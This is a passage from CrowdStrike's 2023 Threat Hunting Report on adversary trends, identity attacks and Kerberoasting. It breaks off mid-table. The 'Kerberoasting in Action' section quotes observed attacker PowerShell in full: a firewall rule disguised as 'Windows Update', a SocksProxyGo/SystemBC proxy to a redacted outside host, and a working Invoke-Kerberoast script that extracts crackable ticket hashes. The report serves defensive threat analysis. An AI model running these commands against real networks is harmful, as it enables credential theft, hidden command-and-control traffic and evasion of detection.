# 2023 Threat Hunting Report

## Table of Contents
- [Foreword](#foreword)
- [Introduction](#introduction)
- [Front-Line Snapshot](#front-line-snapshot)
- [Front-Line Observations](#front-line-observations)
  - [Adversaries Advance the Frontier of Identity Threats](#adversaries-advance-the-frontier-of-identity-threats)
    - [Don’t Get Burned by Kerberoasting](#don’t-get-burned-by-kerberoasting)
    - [Beyond Usernames and Passwords](#beyond-usernames-and-passwords)
    - [Spotlight: Falcon OverWatch Identifies Missing MITRE Identity Technique](#spotlight-falcon-overwatch-identifies-missing-mitre-identity-technique)
  - [Left of Theft: Themes of Early-Stage eCrime](#left-of-theft-themes-of-early-stage-ecrime)
    - [INDRIK SPIDER Brings the Tailored Experience to Opportunistic eCrime](#indrik-spider-brings-the-tailored-experience-to-opportunistic-ecrime)
    - [Access Brokers Abuse Vulnerabilities for Initial Access](#access-brokers-abuse-vulnerabilities-for-initial-access)
    - [Remote Monitoring and Management Tools](#remote-monitoring-and-management-tools)
  - [Adversaries Lead the Charge in Cloud Know-How](#adversaries-lead-the-charge-in-cloud-know-how)
    - [Adversaries Leverage LinPEAS Tool for Cloud Discovery](#adversaries-leverage-linpeas-tool-for-cloud-discovery)
    - [eCrime Adversaries Use Azure Run Commands to Deploy Malware](#ecrime-adversaries-use-azure-run-commands-to-deploy-malware)
    - [Compromised Cloud Credentials Facilitate Widespread Lateral Movement](#compromised-cloud-credentials-facilitate-widespread-lateral-movement)
  - [Cross-Platform Proficiency Takes Center Stage](#cross-platform-proficiency-takes-center-stage)
    - [Linux Insights and Trends](#linux-insights-and-trends)
    - [macOS Insights and Trends](#macos-insights-and-trends)
    - [Threat Actor Spotlight: LABYRINTH CHOLLIMA](#threat-actor-spotlight-labyrinth-chollima)
- [Conclusion](#conclusion)
- [About Falcon OverWatch](#about-falcon-overwatch)
- [CrowdStrike Products and Services](#crowdstrike-products-and-services)

---

© 2023 CrowdStrike, Inc. All rights reserved. NOWHERE TO HIDE
CROWDSTRIKE 2023 THREAT HUNTING REPORT

---

## Foreword

Nearly 12 years ago, a scrappy group of technologists and security professionals came together with a simple idea: building world-class, cloud-delivered endpoint protection that leverages machine learning and artificial intelligence to create a highly dynamic security solution that continues to learn and evolve as endpoints are added and leverages automation to scale.

But the product was only part of the story. This technology would be continuously augmented by professional, efficient incident responders who could transform their front-line insights into tangible data to feed it. The final part of the story is that all of this would be powered by intelligence, drawing on human expertise and ingenuity across a diverse range of disciplines to provide endpoint security that is, at its core, informed by today’s threat landscape.

When we launched this idea under the CrowdStrike banner, we told the world they don’t have a malware problem, they have an adversary problem. Key to this message is stopping the breaches perpetrated by these adversaries. Through the combination of technology, people and intelligence, we raised the cost for these adversaries — and continue to do so every day.

In the time since, CrowdStrike has continuously innovated. Our single-agent technology has grown into the vulnerability management space and driven innovation across cloud workloads, control planes, containers and the Internet of Things. We fulfilled our promise to deliver government-quality intelligence for the private sector and created an elite threat hunting team known as CrowdStrike® Falcon OverWatch™. As the CrowdStrike Intelligence and Falcon OverWatch teams evolved and grew, they increasingly collaborated on developing visibility from the CrowdStrike Falcon® platform into adversary insights, culminating in CrowdStrike tracking over 215 adversaries today.

The key to this collaboration is speed. When we talk about creating a security solution for the way the threat landscape looks today, we cannot ignore adversary speed. Over the past 12 months, the average breakout time for interactive eCrime intrusion activity was 79 minutes. Falcon OverWatch witnessed one adversary breakout time of just seven minutes. In less than the time it takes to step away from your desk and make a cup of coffee, this adversary had landed on an initial host and moved laterally into the broader victim environment.

The questions CISOs need to ask their teams are, “Have we gotten faster at identifying, investigating and remediating today’s threats? Can we detect an adversary in seven minutes or even seven hours?”

At CrowdStrike, we asked ourselves these questions. We came together to figure out how to get even faster at stopping breaches so our customers can go faster. We determined that closer alignment of threat hunting and intelligence would not only help us get faster but allow us to come back to the premise we started with: raising the cost to the adversary.

With the release of the CrowdStrike 2023 Threat Hunting Report, we are announcing the formation of a new defensive unit: CrowdStrike Counter Adversary Operations. Its mission is to use the collaborative power of hunting and intelligence to raise the cost of doing business for threat actors and give the adversary nowhere to hide.

This report is the first of many publications that readers can expect from CrowdStrike’s newly formed Counter Adversary Operations team. This team formally unites Falcon OverWatch and CrowdStrike Intelligence under a single umbrella, deepening the already well-established collaboration between these teams.

This year’s report is the culmination of the past 12 months of proactive, intelligence-informed threat hunting. In this 12-month period, Falcon OverWatch threat hunters:

*   Directly identified approximately one potential intrusion every seven minutes. Over the course of a year, this adds up to tens of thousands of instances where human-driven hunting was instrumental in uncovering adversaries actively seeking to evade autonomous detection methods.
*   Distilled their findings into the development of hundreds of new behavioral-based preventions. In practice, this means at least once per day on average, Falcon OverWatch threat hunters’ front-line findings directly augment the Falcon platform’s ability to detect and prevent the latest threats. Over the course of the past year alone, these new behavioral-based detections have enabled the Falcon platform to prevent an additional 1.5 million malicious events that would have otherwise evaded autonomous detection methods.

These figures represent the Falcon OverWatch team’s around-the-clock efforts to disrupt the adversary. This work forces the adversary to change their approaches and directly raises their costs of operating.

Across all malicious activity tracked by CrowdStrike, 71% of intrusions were malware-free. In a time when adversaries increasingly rely on hands-on-keyboard tactics to achieve their objectives, threat hunting operations must be informed by today’s best threat intelligence.

The new Counter Adversary Operations team will relentlessly track, detect and ultimately disrupt the adversary no matter when or where they operate.

Adam Meyers
SVP of Intelligence

---

## Introduction

Identity threats emerged as the major theme of interactive — aka hands-on-keyboard — intrusions discovered by the CrowdStrike® Falcon OverWatch™ threat hunting team in the past 12 months. In all aspects of operations, adversaries looked for ways to broaden their reach, optimize their tradecraft and deepen their impact. These operations often started with an identity compromise. Adversaries are not relying solely on compromised valid credentials, either — rather, they demonstrated their capacity to abuse all forms of identification and authorization, including weak credentials purchased from the underground, and they elevated their phishing and social engineering tradecraft.

In addition to the broad targeting of identity, several trends stood out this year related to eCrime. First, the continued exploitation of vulnerable software to gain access, particularly in the case of access brokers,¹ demonstrates the need for organizations to have visibility into their external attack surface. The expanded use of zero-day vulnerabilities and the speed at which threat actors were able to develop N-day exploits underscore the importance of vulnerability management and patching. Second, the rampant use of legitimate remote monitoring and management (RMM) tools illustrates adversaries’ attempts to blend into enterprise noise and avoid detection. SCATTERED SPIDER, for example, utilizes numerous RMM tools, enabling them to avoid detection for protracted periods of time to access sensitive data and — more recently — deploy ransomware. Finally, Falcon OverWatch observed adversaries such as INDRIK SPIDER following their otherwise opportunistic initial access attempts with more tailored follow-on behaviors.

Consistent with the expectations outlined in last year’s report, Falcon OverWatch observed adversaries’ increased proficiency in attacks against cloud environments. In the past few months, adversaries have continued to demonstrate that they are adept at navigating all major cloud platforms. In particular, adversaries have been quick to learn how to take advantage of common misconfigurations or abuse the built-in cloud management tooling. The concerning reality is that some adversaries appear to have a better handle on victims’ cloud environments than the organizations themselves.

Finally, cross-platform proficiency is a hallmark of this year’s interactive intrusions. Exemplified by the 3CX supply chain attack perpetrated by LABYRINTH CHOLLIMA — and uncovered by CrowdStrike — many of today’s adversaries are able to confidently navigate multiple operating systems. Whether the adversary is leveraging native applications or cross-platform development tools, the need to be flexible and adapt to any target environment is paramount to continued operational success.

**Reader Note:**

This report is based on insights from the Falcon OverWatch threat hunting team from July 1, 2022, through June 30, 2023.² The findings relate specifically to interactive intrusion activity — that is, activity where a threat actor was operating with hands-on-keyboard in a victim environment. Targeted adversaries refer to state-nexus adversaries.

¹ Access brokers are threat actors that specialize in breaching networks with the intention of selling or providing that access to others.
² Unless stated otherwise, the terms “this year,” “the last year” or “the past year” used throughout the report refer to the period from July 1, 2022, to June 30, 2023.

---

## Front-Line Snapshot

In the reporting period from July 1, 2022, through June 30, 2023, Falcon OverWatch observed interactive intrusion volumes continue to climb, with a total year-over-year increase of 40%. The overall distribution of interactive intrusion activity by threat type remained relatively constant this year compared to previous years, with a small decrease in the proportion of targeted intrusion activity.

![Figure 1. Interactive intrusions over time, 2019 to 2023](https://www.crowdstrike.com/wp-content/uploads/2023/07/2023-threat-hunting-report-figure-1.png)

For the sixth consecutive year, the technology vertical topped the list for the most frequently targeted industry vertical. The telecommunications vertical, which normally holds the second spot, was displaced this year by the financial vertical, which saw a spike in targeting.

### TOP 10 VERTICALS BY INTRUSION FREQUENCY
July 2022 to June 2023

*   TECHNOLOGY
*   FINANCIAL
*   RETAIL
*   HEALTHCARE
*   TELECOMMUNICATIONS
*   SERVICES
*   MANUFACTURING
*   ACADEMIC
*   GOVERNMENT
*   REAL ESTATE

![Figure 2. Top 10 targeted verticals, July 2022 to June 2023](https://www.crowdstrike.com/wp-content/uploads/2023/07/2023-threat-hunting-report-figure-2.png)

### TOP FIVE VERTICALS BY INTRUSION FREQUENCY
Targeted Intrusion vs. eCrime Activity | July 2022 to June 2023

| Vertical           | Targeted Intrusions (%) | eCrime Intrusions (%) | Change in relative frequency compared to July 2021 to June 2022 (2023 %) |
| :----------------- | :---------------------- | :-------------------- | :---------------------------------------------------------------------- |
| TECHNOLOGY         | 21%                     | 21%                   | 0%                                                                      |
| TELECOMMUNICATIONS | 17%                     | 10%                   | 5%                                                                      |
| GOVERNMENT         | 13%                     | 9%                    | 10%                                                                     |
| FINANCIAL          | 11%                     | 8%                    | 15%                                                                     |
| SERVICES           | 7%                      | 7%                    | 20%                                                                     |

![Figure 3. Top five targeted verticals separated by adversary threat type, July 2022 to June 2023](https://www.crowdstrike.com/wp-content/uploads/2023/07/2023-threat-hunting-report-figure-3.png)

In the past year, the volume of interactive intrusion activity against the financial services industry increased by over 80%. Defenders in the financial industry should watch this trend closely, as the increased volume of activity is matched by an increased diversity of threats. This year, Falcon OverWatch uncovered activity in the financial industry spanning all adversary motivation types and targeting all three major operating systems as well as cloud infrastructure.

North Korean adversaries are the most aggressive state-sponsored adversaries to target the financial sector. They continue to engage in prolific, financially motivated operations primarily targeting financial and financial technology (fintech) organizations. eCrime threat actors also routinely target the financial sector. Though some adversaries focus on stealing cryptocurrency or non-fungible tokens (NFTs), opportunistic big game hunting (BGH) ransomware and data theft campaigns remain the primary eCrime threat to financial institutions. Due to the victim organization's need to maintain system uptime and the sensitive nature of the sector, eCrime threat actors likely conclude that financial institutions are willing and able to pay ransom demands.

![Figure 4. Intrusion activity by threat actor heat map, July 2022 to June 2023](https://www.crowdstrike.com/wp-content/uploads/2023/07/2023-threat-hunting-report-figure-4.png)

Please note the following about the data presented in this heat map:

*   The heat mapping represents the number of distinct adversaries active within a particular vertical.
*   The heat mapping does not represent the total number of intrusion attempts within a vertical, as multiple intrusions by the same adversary group are represented only once.
*   Attribution to a high degree of confidence is not always possible. This table does not reflect any unattributed activity that occurred in any industry verticals.

Targeted intrusion activity during this period notably correlated with the respective intelligence collection requirements and other priorities of each adversary grouping. The most straightforward of these is North Korean adversaries’ targeting of financial sector entities — as well as finance-related consulting services — as part of a widespread currency generation effort meant to leverage cryptocurrency theft and, to a lesser extent, ransomware. The diversity of sectors targeted by Iranian (KITTEN) and Chinese (PANDA) state-nexus adversaries are reflective of two distinct, but similar, tradecraft strategies. KITTEN adversaries increasingly rely on opportunistic exploitation of entities of interest, and PANDA adversaries continue to expand operations to achieve coverage across as many targets as possible.

The technology sector continues to be a high-value target for eCrime adversaries, with BGH operations posing the most prevalent eCrime threat to the sector. The technology sector’s reliance on and access to highly sensitive data make it an especially attractive target for BGH operators. BGH operations continue to rely on ransomware and data theft. Other prominent eCrime threats to the technology sector include enabling services, access brokers and information theft campaigns.

![Figure 5. MITRE ATT&CK heat map highlighting the top five techniques Falcon OverWatch observed adversaries use in each tactic area, June 2022 to July 2023](https://www.crowdstrike.com/wp-content/uploads/2023/07/2023-threat-hunting-report-figure-5.png)

Falcon OverWatch tracks interactive intrusion activity against the MITRE ATT&CK® Enterprise Matrix, a framework that categorizes and tracks adversary behavior.³

This heat map illustrates the top five techniques observed across the interactive intrusion activity discovered by Falcon OverWatch in each tactic area during the past year. The technique prevalence underscores a notable shift toward exploitation of identity across all stages of adversarial operations. This shift mirrors the evolution of organizations adapting to an increasingly disparate workforce, highlighting the morphing nature of the modern perimeter.

No longer defined by a rigid outer shell, organizations today rely on identity as the pivotal control point. The consistent appearance of valid accounts across various tactics highlights the intensification of adversaries' strategic use of trusted accounts to gain initial access, establish persistence, elevate privileges and evade defenses. The concerning ease with which adversaries can gain initial access — often simply through purchases — blurs the distinction between legitimate users and imposters. Identifying such stealthy intruders necessitates proactive, identity-based threat hunting combined with a robust understanding of an organization's unique operational landscape.

For full details of the techniques and sub-techniques observed by Falcon OverWatch, see the Falcon OverWatch 2023 MITRE ATT&CK heat map.

³ To learn more about MITRE ATT&CK, visit https://attack.mitre.org/matrices/enterprise/.

---

## Front-Line Observations

### Adversaries Advance the Frontier of Identity Threats

Today, 80% of breaches use compromised identities.⁴ The abuse of identity, particularly when coupled with creative defense evasion methodologies, enables adversaries to hide in plain sight. Despite identity being widely recognized as a growing security threat, the full spectrum of identity threats is not always well understood.

**Reader Note:**

Identity data refers to any information that uniquely identifies an individual or entity (such as data associated with accounts) and authentication and access controls (such as credentials, permissions, security tokens or digital certificates). This scope may extend to additional factors of authentication or data that can be used for the purposes of identity verification. A full list can be seen on page 16.

To ensure environments remain protected, hunters must work with the broadest possible definition of identity, as these types of data are prime targets for adversaries looking to maintain access, enable lateral movement and steal information.

Taking a closer look at the specific techniques involved in identity threats reveals an interesting duality between new and old. Falcon OverWatch recently discovered and documented the abuse of network provider dynamic link libraries (DLLs) as a means to harvest valid credentials. A network provider DLL enables the Windows operating system to communicate with other types of networks by providing support for different networking protocols. This newly documented sub-technique⁵ sees adversaries operate without the need to touch the Local Security Authority Subsystem Service (LSASS) or dump the system Security Account Manager (SAM) hive, both of which are often highly monitored by security tools. This sub-technique provides an evasive way to access valid account details. In contrast, threat hunters also tracked a surge in an old and well-understood technique — Kerberoasting — with the resurgence likely due to continued effectiveness.

**Key Facts and Figures at a Glance:**

*   **62%** OF INTERACTIVE INTRUSIONS INVOLVING THE ABUSE OF VALID ACCOUNTS, WITH 34% OF INTRUSIONS SPECIFICALLY INVOLVED THE USE OF DOMAIN ACCOUNTS OR DEFAULT ACCOUNTS
*   **160%** INCREASE IN ATTEMPTS TO GATHER SECRET KEYS AND OTHER CREDENTIAL MATERIALS VIA CLOUD INSTANCE METADATA APIS
*   **583%** INCREASE IN KERBEROASTING ATTACKS (A SUB-TECHNIQUE OF STEAL OR FORGE KERBEROS TICKETS), WITH VICE SPIDER RESPONSIBLE FOR 27% OF ALL KERBEROASTING ATTACKS

⁴ As reported in the CrowdStrike 2023 Global Threat Report: https://www.crowdstrike.com/global-threat-report/.
⁵ For more information on this sub-technique, see the MITRE website: https://attack.mitre.org/techniques/T1556/008/.

---

#### Don’t Get Burned by Kerberoasting

Over the past year, Falcon OverWatch observed a staggering 583% increase in Kerberoasting attacks⁶ to escalate privileges and enable lateral movement within a victim’s environment (see Figure 6). Windows devices use the Kerberos authentication protocol, which grants tickets to provide users access based on service principal names (SPNs). Kerberoasting specifically involves the theft of tickets associated with SPNs. These tickets contain encrypted credentials that can be cracked offline using brute-force methods to uncover the plaintext credentials.

Kerberoasting is a beneficial technique for adversaries because it targets an SPN associated with an Active Directory account, and because these SPNs are often tied to service accounts, they will usually have higher privileges and allow the adversary to extend their reach and gain access to sensitive files or systems. Additionally, these attacks can be challenging to detect because Kerberos activity is so prevalent in everyday telemetry, which allows adversaries to blend into the noise.

Despite being well documented, this technique poses a significant threat to organizations because adversaries do not need elevated privileges to execute this attack. In the past year, attacks against Kerberos were associated predominantly with eCrime adversaries. VICE SPIDER was the most prolific eCrime adversary, responsible for 27% of all intrusions that involved the Kerberoasting technique.

**INCIDENTS OF KERBEROASTING**
+583% INCREASE YEAR OVER YEAR

![Figure 6. Intrusions featuring Kerberoasting attacks](https://www.crowdstrike.com/wp-content/uploads/2023/07/2023-threat-hunting-report-figure-6.png)

Of the interactive intrusions that involved the use of Kerberoasting, Falcon OverWatch identified a range of initial access vectors, including password spraying, accessing existing remote services through valid accounts, and exploiting vulnerable web servers though web application attacks. It is not unusual for Falcon OverWatch to observe Kerberoasting being used to facilitate lateral movement from a host without appropriate endpoint security coverage.

⁶ For more information on this sub-technique, see the MITRE website (https://attack.mitre.org/techniques/T1558/003/) or the detailed article from CrowdStrike (https://www.crowdstrike.com/cybersecurity-101/kerberoasting/).

---

##### Kerberoasting in Action

In an intrusion by VICE SPIDER, Falcon OverWatch discovered hands-on-keyboard activity against a victim organization in the academic sector. The compromise was associated with multiple hosts across virtual desktop infrastructure (VDI). The threat actor performed basic host reconnaissance to enumerate domain trusts using nltest, then enumerated administrator permissions groups and performed connectivity tests to outbound infrastructure.

Next, the threat actor attempted to exploit the ZeroLogon vulnerability in an attempt to escalate privileges and then tested connectivity to a command-and-control (C2) server using ping. The threat actor then executed SystemBC and SocksProxyGo through PowerShell to proxy connections to their C2 infrastructure. The adversary was clearly mindful of being detected and took several steps to cover their tracks, including setting their proxy connection to operate over non-standard ports, creating a new firewall rule masquerading as a Windows update, and clearing the Security, Application and System logs using wevtutil. Further, they removed the registry entry for RunMRU and TypedPaths — two locations that would shed light on their interactive activity on the system.

**Snippet of SocksProxyGo execution to configure a new outbound firewall rule**
```powershell
New-NetFirewallRule -DisplayName "Windows Update" -Direction Outbound -Action Allow -Protocol TCP -RemotePort 443 -Enabled True | Out-Null; Go -remotePort 443 -remoteHost "[REDACTED IPAddress]"
```

**Snippet of the SystemBC proxy connection being established**
```powershell
$domain = '[REDACTED IPAddress]' # host $dport = 4001 # port $x = New-Object byte[] 50 For ($i=0; $i -ne 50; $i++)
```

After this, the adversary executed a script to perform a Kerberoasting attack and enumerate SPNs. VICE SPIDER’s likely goal was to capture these SPNs to identify Windows service accounts and extract the password hashes. This was confirmed when Falcon OverWatch found the adversary using the Hashcat tool in an attempt to brute-force the password hashes.

**Snippet of a script execution in an attempt to enumerate SPNs**
```powershell
$Null = [Reflection.Assembly]::LoadWithPartialName( 'System.IdentityModel' ); $search = New-Object DirectoryServices.DirectorySearcher( [ADSI]'' ); $search.filter = '(&(servicePrincipalName=*)(objectCategory=user))'; $results = $search.Findall(); foreach ( $results in $results ) { $u = $results.GetDirectoryEntry(); $samAccountName = $u.samAccountName; foreach ( $s in $u.servicePrincipalName )
```

The following is an expanded version of the script above, which was determined to be associated with the Invoke-Kerberoast.ps1 PowerShell script. The Kerberoasting activity below involves Active Directory being queried to request the username and SPN associated with accounts that have an SPN set. The $TicketHexStream variable is storing the hexadecimal value of the Kerberos service ticket, which is then processed to extract a hash that can be used for offline password cracking.

```powershell
$Null = [Reflection.Assembly]::LoadWithPartialName( 'System.IdentityModel' ); $search = New-Object DirectoryServices.DirectorySearcher( [ADSI]'' ); $search.filter = '(&(servicePrincipalName=*)(objectCategory=user))'; $results = $search.Findall(); foreach ( $results in $results ) { $u = $results.GetDirectoryEntry(); $samAccountName = $u.samAccountName; foreach ( $s in $u.servicePrincipalName ) { $Ticket = $null; try { $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $s; } catch [System.Management.Automation.MethodInvocationException] {} if ( $Ticket -ne $null ) { $TicketByteStream = $Ticket.GetRequest(); if ( $TicketByteStream ) { $TicketHexStream = [System.BitConverter]::ToString( $TicketByteStream ) -replace '-'; [System.Collections.ArrayList]$Parts = ( $TicketHexStream -replace '^(.*?)04820...(.*)', '$2' ) -Split 'A48201'; $Parts.RemoveAt( $Parts.Count - 1 ); $Hash = $Parts -join 'A48201'; try { $Hash = $Hash.Insert( 32, '$' ); $HashFormat = '$krb5tgs$23$*' + $samAccountName + '/' + $s + '*$' + $Hash; Write-Host $HashFormat; break; } catch [System.Management.Automation.MethodInvocationException] {} } } } }
```

---

#### Top Five Tools Used in Kerberoasting Attacks

The following table lists — in order — the top five tools Falcon OverWatch observed adversaries use for Kerberoasting attacks over the past year.

| Tool            | What It Does